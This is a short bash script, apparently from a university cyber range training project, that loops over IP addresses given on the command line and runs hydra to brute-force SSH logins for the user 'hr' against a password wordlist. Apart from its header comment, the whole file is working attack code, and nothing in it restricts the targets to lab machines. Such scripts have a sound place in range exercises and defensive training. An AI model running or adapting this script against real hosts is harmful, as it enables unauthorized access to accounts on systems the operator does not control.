#!/bin/bash

<<COMMENT

=============================================================================

 Central Texas Cyber Range (CTCR)

=============================================================================

 Maker:       Ethan Vowels

 Maintainer:  Ethan Vowels

 Project:     CIIRC

 Filename:   sshBruteForce

Git: Abanisenioluwa_oroj1

 Description:

    This script uses hydra to brute force a range of IPs.

 Extension Principle:

    None

 License:

    MIT

 Additional Information:

    - Date Created: 5/16/2024

    - Last Updated: 6/24/2024

    - Contact: ethan_vowels1@baylor.edu

    - Repository: Gitlab CIIRC Hack

=============================================================================

COMMENT

# Ensure this script is run with IP addresses as arguments
if [ $# -lt 1 ]; then
  echo "Usage: $0 <IP_Address1> [IP_Address2] ..."
  exit 1
fi


TARGET_IPS=("$@")


USERNAME="hr"

PASSWORD_LIST="/usr/share/wordlists/password"



for TARGET_IP in "${TARGET_IPS[@]}"; do

	hydra -l $USERNAME -P $PASSWORD_LIST $TARGET_IP -s 22 ssh

done
